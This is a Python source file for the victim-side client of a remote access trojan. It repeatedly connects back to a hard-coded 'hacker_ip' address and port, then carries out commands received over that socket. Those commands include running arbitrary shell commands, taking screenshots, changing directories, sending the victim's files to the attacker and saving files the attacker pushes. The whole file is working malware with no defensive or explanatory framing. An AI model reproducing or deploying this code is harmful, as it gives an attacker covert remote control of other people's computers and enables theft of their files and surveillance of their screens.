import socket
import subprocess
import time
import os
import glob
import json
import struct
from datetime import datetime

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hacker_ip = "192.168.100.17"
hacker_port = 10000
def connect_to_hacker():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((hacker_ip, hacker_port))
            s.settimeout(None)
            return s
        except Exception as e:
            print(f"[!] Connection failed, retrying in 5 seconds: {e}")
            time.sleep(5)

while True:
    victim_socket = connect_to_hacker()
    print("[*] Connected to hacker.")

    try:
        while True:
            try:
                command = victim_socket.recv(1024)

                if not command:
                    print("\nConnection closed by hacker.")
                    break  

                command = command.decode("utf-8")

            except socket.timeout:
                print("\nNo command received: timed out.")
                break 

            except Exception as e:
                print(f"\nConnection lost: {e}")
                break

            if command == "stop":
                print(f"\n{command} is executed successfully!")
                victim_socket.close()
                exit()

            elif command == "screenshot":
                try:
                    import mss
                except ImportError:
                    subprocess.check_output("pip install mss", shell=True, stderr=subprocess.STDOUT)
                    import mss

                try:
                    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                    image_name = f"screenshot-{timestamp}.png"

                    with mss.mss() as sct:
                        sct.shot(output=image_name)
                    
                except Exception as e:
                    print(f"Capturing Screenshot failed! {e}")

                try:
                    victim_socket.send(f"\nScreenshot saved as {image_name}".encode())
                except Exception as e:
                    print(f"Send failed: {e}")

                continue
            
            elif command.startswith("cd"):
                path_to_move = command[3:].strip()
                
                if not path_to_move:
                    current_dir = os.getcwd()
                    try:
                        victim_socket.send(f"\nCurrent directory: {current_dir}".encode())
                    except Exception as e:
                        print(f"\nSend failed: {e}")
                        continue
                    continue
            
                try:
                    os.chdir(path_to_move)
                    print(f"\n{command} is executed successfully!")
                    try:
                        victim_socket.send(f"\nChanged directory to {os.getcwd()}".encode())
                    except Exception as e:
                        print(f"\nSend failed: {e}")
                        continue

                except (FileNotFoundError, PermissionError, OSError) as e:
                    try:
                        victim_socket.send(f"\nFailed to change directory: {str(e)}".encode())
                    except Exception as e:
                        print(f"\nSend failed: {e}")
                        continue
                continue    

            elif command.startswith("download"):
                if len(command.strip()) <= 8 or not command[9:].strip():
                    error_msg = "\nError: Please specify a filename after 'download'\ndownload <filename>"
                    try:
                        victim_socket.send(error_msg.encode())
                    except Exception as e:
                        print(f"\nSend failed: {e}")
                        continue
                    continue

                else:    
                    file_name = command[9:].strip()
                    full_response = ""

                    if "." in file_name:
                        if os.path.exists(file_name):
                            file_exists = f"\nYes, the file ({file_name}) exists!"
                            full_response += file_exists
                            try:
                                victim_socket.send(full_response.encode())
                            except Exception as e:
                                print(f"\nSend failed: {e}")
                                continue
                            time.sleep(0.1)

                            file_size = os.path.getsize(file_name)
                            try:
                                victim_socket.send(struct.pack("!Q", file_size))
                            except Exception as e:
                                print(f"\nSend failed: {e}")
                                continue

                            send_failed = False
                            with open(file_name, "rb") as file:
                                while True:
                                    file_chunk = file.read(1048576)
                                    if not file_chunk:
                                        break
                                    try:
                                        victim_socket.send(file_chunk)
                                    except Exception as e:
                                        print(f"\nSend failed: {e}")
                                        send_failed = True
                                        break
                            if send_failed:
                                continue
                            continue
                        else:
                            file_exists = f"\nNo, the file ({file_name}) doesn't exist!"    
                            full_response += file_exists + "\n"
                            try:
                                victim_socket.send(full_response.encode())
                            except Exception as e:
                                print(f"\nSend failed: {e}")
                                continue
                            continue

                    else:
                        matched_files = glob.glob(file_name + ".*")
                        if len(matched_files) == 0:
                            file_exists = f"\nNo, the file ({file_name}) doesn't exist!"
                            full_response += file_exists
                            try:
                                victim_socket.send(full_response.encode())
                            except Exception as e:
                                print(f"\nSend failed: {e}")
                                continue
                            continue
                            
                        message = f"\nAll files with ({file_name}) name!"
                        full_response += message + "\n"
                        serialized_files = json.dumps(matched_files)
                        for file in serialized_files.strip('[]').replace('"', '').split(','):
                            full_response += "  [+] " + file.strip() + "\n"
                        warning = f"\nType the exact file name (with extension!)"
                        full_response += warning + "\n"

                        try:
                            victim_socket.send(full_response.encode())
                        except Exception as e:
                            print(f"\nSend failed: {e}")
                            continue
                        continue

            elif command.startswith("upload"):
                file_name = command[7:].strip()

                try:
                    raw_size = victim_socket.recv(8)
                except Exception as e:
                    print(f"\nFailed to receive file size: {e}")
                    break

                if len(raw_size) < 8:
                    print("\nFailed to receive complete file size!")
                    continue

                file_size = struct.unpack("!Q", raw_size)[0]
                
                if file_size == 0:
                    print(f"[*] Received 0 file size. Assuming hacker indicated file not found on their end or file is empty.")
                    continue
                else:
                    print(f"Receiving file [{file_name}] ({file_size} bytes)...\n")
                received_data = b""
                while len(received_data) < file_size:
                    try:
                        file_chunk = victim_socket.recv(5242880)
                    except Exception as e:
                        print(f"\nError during file receive: {e}")
                        break
                    if not file_chunk:
                        print("\nConnection lost while downloading!")
                        break
                    received_data += file_chunk

                file_name = command[7:].strip()
                try:
                    if len(received_data) == file_size:
                        with open(file_name, "wb") as file:
                            file.write(received_data)
                        print(f"[*] File '{file_name}' received and saved successfully.")
                    else:
                        print(f"[!] File '{file_name}' reception incomplete. Expected {file_size}, got {len(received_data)}. Not saving.")
                except Exception as e:
                    print(f"\nFailed to write file: {e}")

                continue
                
            else:                
                try:
                    encoding = "utf-8"
                    if(os.name == "nt"):
                        encoding = "cp437"
                    command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    decoded_output = command_output.decode(encoding, errors="replace").strip()
                    if(decoded_output == ""):
                        command_output = f"\n{command} executed successfully (no output)!".encode()
                    else:
                        command_output = decoded_output.encode("utf-8")
                
                except subprocess.CalledProcessError as e:
                    if e.output:
                        error_output = e.output.decode(encoding, errors="replace")
                    else:
                        error_output = str(e)
                    command_output = f"\nCommand failed:\n{error_output}".encode()
                
                except Exception as e:
                    command_output = f"\nError: {str(e)}".encode()

                print(f"\n{command} is executed successfully!")
                
                try:
                    victim_socket.send(command_output)
                except Exception as e:
                    print(f"\nSend failed: {e}")
                    continue
            
    except Exception as e:
        print(f"[!] Connection error: {e}")

    victim_socket.close()
    print("[*] Disconnected. Reconnecting in 5 seconds...")
    time.sleep(5)

